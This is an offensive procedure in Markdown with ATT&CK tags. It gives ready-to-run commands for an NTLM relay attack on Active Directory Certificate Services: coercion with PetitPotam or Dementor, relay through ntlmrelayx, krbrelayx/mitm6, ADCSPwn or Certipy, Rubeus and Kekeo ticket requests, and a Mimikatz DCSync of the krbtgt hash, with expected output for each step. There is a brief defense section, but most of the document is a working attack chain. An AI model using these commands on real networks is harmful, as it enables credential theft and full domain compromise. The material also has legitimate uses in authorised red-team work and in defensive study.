---
id: 283f7da1-28e6-4082-a1fa-19c07482b8f2
name: AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.015482+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Forge Web Credentials|T1606 - Forge Web Credentials]]'
  - '[[techniques/Pass the Hash|T1075 - Pass the Hash]]'
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Certificate Services]]'
  - '[[tags/ESC8 - AD CS Relay Attack]]'
commands:
  - '[[commands/run-ntlmrelayx-adcs]]'
  - '[[commands/coerce-auth-ms-esfrpc-petitpotam]]'
  - '[[commands/coerce-auth-printspooler-dementor]]'
  - '[[commands/rubeus-asktgt-certificate-ptt]]'
  - '[[commands/mimikatz-dcsync-krbtgt]]'
  - '[[commands/setup-krbrelayx-adcs]]'
  - '[[commands/run-mitm6-relay]]'
  - '[[commands/adcspwn-relay-attack]]'
  - '[[commands/certipy-relay-setup]]'
  - '[[commands/ntlmrelayx-domaincontroller-template]]'
  - '[[commands/mimikatz-efs-connect]]'
  - '[[commands/kekeo-ask-tgt-pfx]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/PetitPotam]]'
  - '[[tools/Rubeus]]'
  - '[[tools/Impacket]]'
  - '[[tools/ADCSPwn]]'
  - '[[tools/mitm6]]'
  - '[[tools/krbrelayx]]'
  - '[[tools/Certipy]]'
  - '[[tools/Mimikatz]]'
  - '[[tools/kekeo]]'
skill_level: advanced
impact_level: high
detection_risk: high
validated: true
---

# AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam

## Summary

This procedure outlines an NTLM relay attack against Active Directory Certificate Services (AD CS) using authentication coercion techniques with PetitPotam or alternatives like Dementor, relaying to acquire certificates via ntlmrelayx, and then leveraging Rubeus to request TGTs for privilege escalation, such as DCSync. It covers variants including Kerberos relay with mitm6 and krbrelayx, as well as tools like ADCSPwn and Certipy for streamlined relay operations in domain environments.

## Description

In this attack, an attacker coerces a target machine to authenticate to a listener controlled by the attacker, relays the NTLM authentication to an AD CS server to request a certificate on behalf of the victim, and uses the certificate to impersonate the user or machine for further actions like signing code or dumping credentials. This exploits misconfigurations in AD CS templates allowing vulnerable enrollment. The procedure targets Windows domain environments with AD CS enabled, requiring network access to coerce authentication without SMB signing enforced. Success enables forging web credentials for lateral movement and credential access, potentially leading to domain compromise.

## Requirements

1. Network access to a Windows domain with an active AD CS server (e.g., via VPN or compromised host).
2. Attacker machine with Python 3 and tools installed: Impacket (for ntlmrelayx), PetitPotam, Rubeus, Mimikatz, and others listed in tools.
3. Domain credentials or low-priv access for coercion (optional for some variants).
4. No SMB signing enforced on targets; HTTP access to AD CS web enrollment (e.g., /certsrv).
5. Target environment: Windows Server 2016+ with AD CS role, vulnerable templates like 'VulnTemplate' or 'Machine'.

## Defense

- Enable SMB signing domain-wide to prevent NTLM relay (Group Policy: Microsoft network server: Digitally sign communications).
- Disable NTLM authentication where possible, enforcing Kerberos or LDAP channel binding/signing.
- Monitor AD CS for abnormal certificate requests (Event ID 4886/4887 in Certificate Services logs) and restrict templates to require manager approval or SAN restrictions.
- Block coercion techniques by disabling unnecessary RPC endpoints (e.g., MS-EFSRPC, MS-RPRN) or using Windows Defender ATP for anomalous auth patterns.
- Implement certificate pinning and auditing for certificate usage in authentication.

## Objectives

1. Coerce target authentication and relay NTLM to AD CS for certificate acquisition using compromised credentials.
2. Impersonate users or machines with the forged certificate to perform actions like code signing or accessing encrypted data.
3. Escalate privileges by requesting TGTs for high-priv accounts (e.g., Domain Controller) and performing DCSync to extract hashes.

## Instructions

This procedure covers the primary NTLM relay flow and variants. Execute in sequence for the main attack; adapt for specific targets.

### Step 1: Set Up NTLM Relay Listener for AD CS

**Context**: Start the relay server to target the AD CS web enrollment endpoint, specifying a vulnerable template if needed (e.g., 'VulnTemplate' for workstations, 'DomainController' for escalation).

**Command** ([[commands/run-ntlmrelayx-adcs]]):
```bash
python3 ntlmrelayx.py -t http://$_CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template $_TEMPLATE_NAME
```

> This command launches the Impacket NTLM relay, listening for coerced auth and relaying to AD CS. Replace $_CA_SERVER with the AD CS IP/FQDN (e.g., 10.10.10.10) and $_TEMPLATE_NAME with the vulnerable template (e.g., VulnTemplate, Machine, DomainController). Expected output includes relay startup logs like "Relay server listening on 0.0.0.0:445". Success: No errors, listener active.

### Step 2: Coerce Authentication with PetitPotam (MS-EFSRPC)

**Context**: Force the target to authenticate to the relay listener using the EfsRpcOpenFileRaw RPC function, triggering NTLM relay to AD CS.

**Command** ([[commands/coerce-auth-ms-esfrpc-petitpotam]]):
```bash
python3 petitpotam.py $_DOMAIN $_USERNAME $_PASSWORD $_ATTACKER_IP $_TARGET_IP
```

> Run this after starting the relay. Parameters: $_DOMAIN (e.g., lab.local), $_USERNAME/$_PASSWORD (optional creds), $_ATTACKER_IP (relay listener IP), $_TARGET_IP (victim machine). If no creds, omit -u/-p. Expected output: "Coercion sent to target". The relay logs will show incoming NTLM and certificate generation (base64 output). Success: Certificate acquired in relay logs.

### Step 3: Alternative Coercion with Dementor (PrintSpooler MS-RPRN)

**Context**: If PetitPotam fails (e.g., RPC disabled), use Dementor to coerce via PrintSpooler RPC as a fallback.

**Command** ([[commands/coerce-auth-printspooler-dementor]]):
```bash
python3 dementor.py $_ATTACKER_IP $_TARGET_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN
```

> Parameters similar to PetitPotam. Example: python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local. Expected: Coercion success message. Relay captures auth for cert. Success: NTLM relay triggers certificate issuance.

### Step 4: Request TGT with Rubeus Using Acquired Certificate

**Context**: Use the base64 certificate from relay output to request a Kerberos TGT for the victim user/machine via Rubeus, injecting it for impersonation.

**Command** ([[commands/rubeus-asktgt-certificate-ptt]]):
```bash
Rubeus.exe asktgt /user:$_USERNAME /certificate:$_BASE64_CERT /ptt
```

> $_USERNAME (e.g., dc1$), $_BASE64_CERT (from relay, e.g., MIIRdQIBAzC...mUUXS). Expected: "TGT request successful, ticket injected". Success: klist shows new ticket for the user.

### Step 5: Perform DCSync with Injected TGT

**Context**: With the TGT, use Mimikatz to replicate krbtgt hash via DCSync for further attacks like Golden Ticket.

**Command** ([[commands/mimikatz-dcsync-krbtgt]]):
```bash
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

> Run in Mimikatz after TGT injection. Expected: Hashes dumped, e.g., "Hash NTLM: 31d6cfe0...". Success: krbtgt NTLM hash extracted.

### Step 6: Variant - Acquire Domain Controller Hashes (Escalation)

**Context**: For DC targeting, use DomainController template in relay, then connect via EFS and request TGT with Kekeo.

**Command** ([[commands/ntlmrelayx-domaincontroller-template]]):
```bash
python3 ./examples/ntlmrelayx.py -t http://$_CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

> Follow with coercion (Step 2/3). Then:

**Command** ([[commands/mimikatz-efs-connect]]):
```bash
mimikatz.exe "misc::efs /server:$_DC_FQDN /connect:$_IP /noauth" exit
```

> $_DC_FQDN (e.g., dc.lab.local), $_IP (DC IP).

**Command** ([[commands/kekeo-ask-tgt-pfx]]):
```bash
kekeo.exe "base64 /input:on" "tgt::ask /pfx:$_BASE64_CERT /user:dc$ /domain:$_DOMAIN /ptt" exit
```

> Then repeat Step 5 for DCSync. Expected: TGT injected, hashes dumped. Success: DC-level access.

### Step 7: Variant - Kerberos Relay with mitm6 and krbrelayx

**Context**: For IPv6/LLMNR poisoning, set up Kerberos relay to AD CS.

**Command** ([[commands/setup-krbrelayx-adcs]]):
```bash
sudo krbrelayx.py -t http://$_CA_SERVER/certsrv -ip $_ATTACKER_IP --victim $_TARGET_DOMAIN --adcs --template Machine
```

> $_TARGET_DOMAIN (e.g., target.domain.local).

**Command** ([[commands/run-mitm6-relay]]):
```bash
sudo mitm6 --domain $_DOMAIN --host-allowlist $_TARGET_DOMAIN --relay $_CA_FQDN -v
```

> Run concurrently. Expected: Poisoning logs, relay captures Kerberos for cert. Success: Certificate via Kerberos auth.

### Step 8: Variant - Perform Relay with ADCSPwn

**Context**: Use ADCSPwn for integrated coercion and relay, targeting EFSRPC by default.

**Command** ([[commands/adcspwn-relay-attack]]):
```bash
adcspwn.exe --adcs $_CA_SERVER --remote $_TARGET_MACHINE --port $_LISTEN_PORT --output $_OUTPUT_FILE
```

> Optional: --username $_USER --password $_PASS --dc $_DC --unc $_UNC_PATH. Example: adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001 --output C:\Temp\cert_b64.txt. Expected: Base64 cert in output file. Success: Cert generated without separate coercion.

### Step 9: Variant - Set Up Certipy Relay

**Context**: Configure Certipy for relay operations, specifying CA for certificate targeting.

**Command** ([[commands/certipy-relay-setup]]):
```bash
certipy relay -ca $_CA_IP
```

> $_CA_IP (e.g., 172.16.19.100). Expected: Relay listener starts. Combine with coercion. Success: Ready for auth relay to CA.
